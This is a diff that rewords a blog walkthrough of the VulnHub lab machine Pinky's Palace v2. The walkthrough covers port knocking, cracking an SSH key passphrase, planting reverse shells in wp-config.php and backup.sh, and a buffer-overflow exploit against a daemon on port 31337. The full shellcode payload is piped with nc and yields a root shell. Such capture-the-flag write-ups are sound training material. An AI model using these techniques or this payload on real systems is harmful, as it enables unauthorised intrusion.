@@ -18,7 +18,7 @@ This post documents the complete walkthrough of Pinky's Palace: v2, a boot2root 
 
 ### Background
 
-A realistic and ***hellish*** (emphasis mine) boot2root. The objective is to gain access to the system and read `/root/root.txt`. Before we begin, there's an added advantage to map `pinkydb` to the assigned IP address through `/etc/hosts`.
+A realistic and ***hellish*** (emphasis mine) boot2root. The goal is to gain `root` access and read `/root/root.txt`. Before we begin, there's an added benefit to map `pinkydb` to the assigned IP address through `/etc/hosts`.
 
 ### Information Gathering
 
@@ -30,7 +30,7 @@ Let's kick this off with a `nmap` scan to establish the services available in th
 PORT      STATE    SERVICE REASON         VERSION
 80/tcp    open     http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
 |_http-generator: WordPress 4.9.4
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.25 (Debian)
 |_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
@@ -39,11 +39,11 @@ PORT      STATE    SERVICE REASON         VERSION
 31337/tcp filtered Elite   no-response
 ```
 
-Alas, only `tcp/80` is open. And no SSH service as there usually is although the rest of the filtered ports may prove interesting later. Who knows?
+Alas, `nmap` found one open port `tcp/80`. And no SSH service although the rest of the filtered ports may prove interesting later. Who knows?
 
 ### Directory/File Enumeration
 
-Let's press on with more enumeration. Using `wfuzz` and `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists) again suggested two WordPress blogs residing in the host and the presence of one very interesting directory `/secret`.
+Let's press on with more enumeration. Using `wfuzz` and `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists) again suggested two WordPress blogs residing in the host and the presence of one interesting directory `/secret`.
 
 ```
 # wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 http://pinkydb/FUZZ
@@ -68,7 +68,7 @@ ID	Response   Lines      Word         Chars          Payload
 019965:  C=301      9 L	      28 W	    322 Ch	  "wp-includes"
 ```
 
-A text file was found at `http://pinkydb/secret/bambam.txt`.
+I found a text file at `http://pinkydb/secret/bambam.txt`.
 
 ```
 # curl http://pinkydb/secret/bambam.txt
@@ -80,7 +80,7 @@ pinkydb
 ```
 ### WordPress
 
-Let's use `wpscan` on `pinkydb` to see if we can enumerate things further.
+Since `wfuzz` has found WordPress installed on `pinkydb`, let's use `wpscan` on it to see what WordPress vulnerabilities are there.
 
 ```
 # wpscan --url pinkydb --enumerate u
@@ -88,11 +88,11 @@ _______________________________________________________________
         __          _______   _____                  
         \ \        / /  __ \ / ____|                 
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
-        WordPress Security Scanner by the WPScan Team 
+        WordPress Security Scanner by the WPScan Team
                        Version 2.9.3
           Sponsored by Sucuri - https://sucuri.net
    @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
@@ -110,18 +110,18 @@ _______________________________________________________________
     +----+-----------+---------------------+
 ```
 
-While we are at the blog and coming from past experience where non-English words were spotted, there might be a chance one of those words is a password. Let's build a wordlist with `cewl`.
+While I was skimming through the blog I spotted non-English words. Based on past experience, there might be a chance one of those words is a password. Let's build a wordlist with `cewl`.
 
 ```
 # cewl -m3 pinkydb 2>/dev/null | sed 1d | tee cewl.txt
 # john --rules --wordlist=cewl.txt --stdout | tee wordlist.txt
 ```
 
-Unfortunately, none of the words yielded any results with WordPress.
+Too bad none of the words yielded any results with WordPress.
 
 ### Knock Knock. Who's There?
 
-Moving on to `bambam.txt` and if I've to guess, I'd say we are looking at ports (`0-65535`) and that means port-knocking is in the works.
+Moving on to `bambam.txt`. And if I've to guess, I'd say I'm looking at ports (`0-65535`) and that means port-knocking is in the works for me.
 
 To that end, I wrote a port-knocking script, `knock.sh` using `nmap`.
 
@@ -140,13 +140,13 @@ for ports in $(cat sequence.txt); do
 done
 {% endhighlight %}
 
-`sequence.txt` is a text file containing all the permutations of `8890,7000,666` and it can be generated with Python like so.
+`sequence.txt` is a text file containing all the permutations of `8890,7000,666` and Python can generate it like so.
 
 ```
 python -c 'import itertools; print list(itertools.permutations([8890,7000,666]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq > sequence.txt
 ```
 
-When the sequence `7000,666,8890` was reached, three additional services were revealed, including the familiar SSH service.
+When `knock.sh` reached the sequence `7000,666,8890`, it revealed three more services including the familiar SSH service.
 
 ```
 # ./knock.sh 192.168.10.130
@@ -155,34 +155,34 @@ When the sequence `7000,666,8890` was reached, three additional services were re
 PORT      STATE SERVICE REASON         VERSION
 80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
 |_http-generator: WordPress 4.9.4
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.25 (Debian)
 |_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
 4655/tcp  open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
 |   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
 |_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)
 7654/tcp  open  http    syn-ack ttl 64 nginx 1.10.3
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST
 |_http-server-header: nginx/1.10.3
 |_http-title: 403 Forbidden
 31337/tcp open  Elite?  syn-ack ttl 64
-| fingerprint-strings: 
-|   GetRequest: 
+| fingerprint-strings:
+|   GetRequest:
 |     [+] Welcome to The Daemon [+]
 |     This is soon to be our backdoor
 |     into Pinky's Palace.
 |     HTTP/1.0
-|   NULL: 
+|   NULL:
 |     [+] Welcome to The Daemon [+]
 |     This is soon to be our backdoor
 |_    into Pinky's Palace.
 ```
 
-Now that I've determined the correct sequence to unlock those ports, I could simply use `nmap` to unlock them again.
+Now that I've determined the correct sequence to unlock those ports, I could use `nmap` to unlock them again.
 
 ```
 # for p in 7000 666 8890; do nmap -n -v0 -Pn --max-retries 0 -p $p 192.168.10.130; done
@@ -227,13 +227,13 @@ demon:x:1001:1001::/home/demon:/bin/bash
 stefano:x:1002:1002::/home/stefano:/bin/bash
 ```
 
-Well, it appears that `stefano` has an account in `pinkydb`. On top of that, `stefano` also has his SSH private key seen above. I guess that's an invitation to login to his account via SSH.
+It appeared that `stefano` has an account in `pinkydb`. On top of that, `stefano` also has his SSH private key as seen above. I guess that's an open invitation to login to his account via SSH.
 
-Unfortunately, his RSA private key was protected by a password when I tried to login. Nonetheless, using `ssh2john` and `John the Ripper` recovering the password was a piece of cake.
+When I tried to login, I found his RSA private key protected by a password. Nonetheless, using `ssh2john` and `John the Ripper` to recover the password was a piece of cake.
 
 ```
 # ssh2john id_rsa > id_rsa.hash
-# john --show id_rsa.hash 
+# john --show id_rsa.hash
 id_rsa:secretz101
 ```
 
@@ -243,13 +243,13 @@ With the password out of the way, logging in to `stefano`'s account is almost tr
 
 ### Privilege Escalation
 
-During enumeration of `stefano`'s account, an executable `/home/stefano/tools/qsub` and a bash script `/usr/local/bin/backup.sh` were observed which I believed to be the key pieces to the privilege escalation puzzle.
+During enumeration of `stefano`'s account, I observed an executable `/home/stefano/tools/qsub` and a bash script `/usr/local/bin/backup.sh` believed to be the key pieces to the privilege escalation puzzle.
 
 ![screenshot-5](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-5.png)
 
 ![screenshot-6](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-6.png)
 
-However, in order to read `/home/stefano/tools/qsub`, I'll need to be `pinky` or `www-data`. Since I don't know `pinky`'s password, the other way would be to see if I could edit any of the `.php` files in `/var/www` (the home directory of `www-data`).
+To read `/home/stefano/tools/qsub`, I'll need to be `pinky` or `www-data`. Since I don't know `pinky`'s password, the other way would be to see if I could edit any of the `.php` files in `/var/www` (the home directory of `www-data`).
 
 ```
 $ find /var/www -perm /o+w
@@ -262,25 +262,25 @@ I could edit `wp-config.php` like so and run a reverse shell back to me so that 
 
 ![screenshot-8](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-8.png)
 
-I could copy `qsub` encoded in `base64` (shown above) over to my analysis machine and decode it back to the binary form.
+I could copy `qsub` encoded in `base64` over to my analysis machine and decode it back to the binary form.
 
 ![screenshot-9](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-9.png)
 
-Now that `qsub` is on my machine I could perform preliminary reverse engineering and after stepping through the `main()` and `send()` functions, the following can be summarized:
+Now that `qsub` is on my machine I could perform preliminary reverse engineering and after stepping through the `main()` and `send()` functions:
 
 * The program `qsub` has one argument - the message to `pinky`
 * The input password is less than or equal to 40 characters and is the value of `TERM` environment variable
 * The `send()` function is an abstraction for `/bin/echo [Message] >> /home/pinky/messages/stefano_msg.txt`
 
-_`qsub` is comparing the input password with the value of the `TERM` environment variable_
+_`qsub` compares the input password with the value of the `TERM` environment variable_
 
 ![screenshot-10](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-10.png)
 
-_`system()` library function is used to execute shell command `/bin/echo`_
+_`system()` library function executes shell command `/bin/echo`_
 
 ![screenshot-11](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-11.png)
 
-Since I knew how `qsub` worked and it was `setuid` to `pinky`, I could exploit it to create `/home/pinky/.ssh/authorized_keys` with a RSA key pair I control.
+Since I knew how `qsub` worked and it has been `setuid` to `pinky`, I could exploit it to create `/home/pinky/.ssh/authorized_keys` with a RSA key pair I control.
 
 The steps are slightly convoluted but the end result is deeply satisfying:
 
@@ -295,7 +295,7 @@ The steps are slightly convoluted but the end result is deeply satisfying:
 
 ![screenshot-12](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-12.png)
 
-The objective of gaining control of `pinky`'s account is so that I could edit `/usr/local/bin/backup.sh` and include this line and run a reverse shell back to me as `demon`.
+The aim of gaining control of `pinky`'s account is so that I could edit `/usr/local/bin/backup.sh`, add this line and run a reverse shell back to me as `demon`.
 
 ![screenshot-13](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-13.png)
 
@@ -303,7 +303,7 @@ On my machine I've set up a `netcat` listener to receive the reverse shell.
 
 ![screenshot-14](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-14.png)
 
-Now I can use the same Jedi trick of copying over a RSA public key I control, login with SSH and take full control of `demon`'s account, complete with auto-completion and full output control.
+Now I can use the same Jedi trick of copying over a RSA public key I control, login with SSH and take full control of `demon`'s account.
 
 ![screenshot-15](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-15.png)
 
@@ -311,17 +311,17 @@ But the work is far from complete. The final piece of the privilege escalation p
 
 ![screenshot-18](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-18.png)
 
-I used `scp` to grab a copy of `/daemon/panel` to my analysis machine (running 64-bit Kali Linux and replicating the conditions of `pinkydb` as closely as possible) where [PEDA](https://github.com/longld/peda) is available and so that I could analyze it with `gdb`. To be more precise, I ran `./panel` and attached `gdb` to it.
+I used `scp` to grab a copy of `/daemon/panel` to my analysis machine (running 64-bit Kali Linux and replicating the conditions of `pinkydb` as close as possible) where [PEDA](https://github.com/longld/peda) is available and so that I could analyze it with `gdb`. To be more precise, I ran `./panel` and attached `gdb` to it.
 
 ![screenshot-19](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-19.png)
 
-As seen above, ASLR was enabled and the stack was executable.
+As seen above, ASLR was not disabled and the stack was executable.
 
-Using `readelf`, I spotted the `main()` function along with the `handlecmd()` function which I guessed handles the input provided to the program listening at `tcp/31337`.
+Using `readelf`, I spotted the `main()` function along with the `handlecmd()` function which I supposed handles the input provided to the program listening at `tcp/31337`.
 
 ![screenshot-20](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-20.png)
 
-Disassembling the function with `gdb`, a breakpoint could be placed at `*handlecmd+70` before control is passed back to the program. It's here where I can analyze the stack overflow and the offset with which to control the RIP.
+Disassembling the function with `gdb`, I placed a breakpoint at `<handlecmd+70>` before the program took back control. I can analyze the stack overflow and the offset with which to control the RIP at this point.
 
 ![screenshot-21](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-21.png)
 
@@ -329,17 +329,17 @@ I created a 200-byte pattern with `pattern_create`, save it to a file and then s
 
 ![screenshot-22](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-22.png)
 
-The breakpoint at `*handlecmd+70` was hit.
+`gdb` stopped the program at `<handlecmd+70>`.
 
 ![screenshot-23](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-23.png)
 
-Using the command `pattern_offset` to search for the pattern, the offset was found to be 120 bytes.
+The command `pattern_offset` found the pattern or offset at 120 bytes.
 
 ![screenshot-24](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-24.png)
 
-The basic exploit structure can then be constructed like this.
+The basic exploit structure looked like this.
 
-`# perl -e 'print "A" x 120 . "BBBBBB"'` where `BBBBBB` is the return address yet to be determined.
+`# perl -e 'print "A" x 120 . "BBBBBB"'` where `BBBBBB` is the return address yet undetermined.
 
 ![screenshot-25](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-25.png)
 
@@ -363,11 +363,11 @@ The stage is now set for the real privilege escalation.
 # perl -e 'print "\x90" . "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xd7\x5f\x69\x30\xa9\x2d\x85\x1e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbd\x76\x31\xa9\xc3\x2f\xda\x74\xd6\x01\x66\x35\xe1\xba\xcd\xa7\xd5\x5f\x78\x6c\x69\x85\x8f\x9e\x86\x17\xe0\xd6\xc3\x3d\xdf\x74\xfd\x07\x66\x35\xc3\x2e\xdb\x56\x28\x91\x03\x11\xf1\x22\x80\x6b\x21\x35\x52\x68\x30\x65\x3e\x31\xb5\x36\x07\x1f\xda\x45\x85\x4d\x9f\xd6\x8e\x62\xfe\x65\x0c\xf8\xd8\x5a\x69\x30\xa9\x2d\x85\x1e" . "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337
 ```
 
-On my `netcat` listener, a `root` shell is returned.
+On my `netcat` listener, a `root` shell appeared.
 
 ![screenshot-28](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-28.png)
 
-With a few more keystrokes to get a better looking shell, the flag is basically there for the taking.
+With more keystrokes to get a better looking shell, the flag is basically there for the taking.
 
 ![screenshot-29](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-29.png)
 
@@ -375,11 +375,11 @@ With a few more keystrokes to get a better looking shell, the flag is basically 
 
 ### Afterthought
 
-Honestly, I thought Pinky's Palace was a misnomer. More like Pinky's Dungeon :sweat_smile: 
+To be honest, I thought Pinky's Palace was a misnomer. It should be Pinky's Dungeon instead :sweat_smile:
 
-Walking through this VM took longer than usual because of the numerous twists and turns. It encouraged me to document down the crucial sections meticulously and I took more screen captures. It certainly lived up to its name of being harder than the first one, particularly with the reverse engineering of `qsub` and the exploit development for `panel`.
+Walking through this VM took longer than usual because of the twists and turns. I had to document down the crucial sections and took more screen captures. It certainly lived up to its name of being harder than the first one with the reverse engineering of `qsub` and the exploit development for `panel`.
 
-Overall, I must say it was extremely well-designed :+1:
+I give it a :+1:
 
 [1]: https://www.vulnhub.com/entry/pinkys-palace-v2,229/
 [2]: https://twitter.com/@Pink_P4nther
